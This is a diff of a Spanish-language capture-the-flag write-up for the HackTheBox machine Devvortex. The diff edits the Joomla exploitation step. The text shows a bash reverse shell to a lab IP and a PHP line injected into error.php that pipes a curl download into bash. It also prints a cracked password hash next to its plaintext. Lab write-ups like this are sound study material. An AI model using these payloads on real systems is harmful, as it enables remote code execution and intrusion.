@@ -1,6 +1,6 @@
 ---
 title: Devvortex
-date: 2026-1-7 12:00:00 +0200
+date: 2026-1-7 08:00:00 +0200
 categories: [writeup, hackthebox]
 tags: [hackthebox, devvortex ]     
 image:
@@ -10,6 +10,7 @@ image:
 
 > Devvortex
 Linux · Easy - Adventure mode
+
 
 
 ## 🔭 Reconocimiento:
@@ -160,7 +161,8 @@ Itenté la explotación con una revershell basada en este tutorial
 [https://vk9-sec.com/exploitation-reverse-shell-joomla/](https://vk9-sec.com/exploitation-reverse-shell-joomla/)
 Sin embargo algo que parecía más "standard" ```system(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.166/4444 0>&1′”);```
 no funcionaba y al final opté por realizarlo con curl y recoger una revershell sirviéndola con Python.
-Ahora solo hay que visitar la página y recibir la revershell, ya sea con el navegador o con Curl.  
+Introducimos el siguiente código en ```error.php``` ```<?php system("curl 10.10.14.70:8000/rev.sh|bash"); ?>``` y le damos
+al botón ```save```. 
 
 ``` shell
 ┌──(pmartinezr㉿kali)-[~/htb/devvortex]
@@ -202,7 +204,7 @@ select * from sd4fg_users;
 +-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
 2 rows in set (0.00 sec)
 ```
-
+Ahora solo hay que visitar la página y recibir la revershell, ya sea con el navegador o con Curl.  
 Teníamos la password de ```Mysql``` así que era buena idea buscar algo en la base de datos. 
 
 Con hashcat obtenemos la siguiente password: ```$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho```
